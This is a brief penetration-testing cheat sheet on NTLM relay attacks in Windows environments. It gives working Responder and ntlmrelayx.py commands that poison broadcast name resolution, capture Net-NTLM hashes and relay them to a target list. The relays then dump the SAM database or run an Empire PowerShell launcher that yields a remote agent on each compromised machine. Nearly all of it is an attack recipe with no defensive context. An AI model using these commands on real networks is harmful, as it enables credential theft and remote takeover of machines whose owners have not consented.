# Relaying in Windows Environments
#
# 1. We're using Responder to intercept authentication attempts (Net-NTLM
#    hashes) via Multicast/Broadcast protocols;
# 2. However, since we turned off Responder's SMB and HTTP servers and have
#    ntlmrelayx.py running, those authentication attempts get automatically
#    passed to ntlmrelayx.py's SMB and HTTP servers;
# 3. ntlmrelayx.py takes over and relays those hashes to our target list. If
#   the relay is successful it will dump the SAM database or execute a
#   specified command, such as, our Empire launcher and give us
#   an Empire Agent on the target machine;

# Remember that the only difference between ntlmrelayx and smbrelayx
# is that ntlmrelayx tries to relay not only to SMB; hence it's more general


# Get the Net-NTLM Hashes
# Remember to disable SMB and HTTP from the Responder.conf
python Responder.py -I <interface> -r -d -w

# Perform NTLM relays and dump SAM database
ntlmrelayx.py -tf targets.txt

# Perform NTLM relays and launch an empire powershell payload
ntlmrelayx.py -tf targets.txt -c <insert your Empire Powershell launcher here>
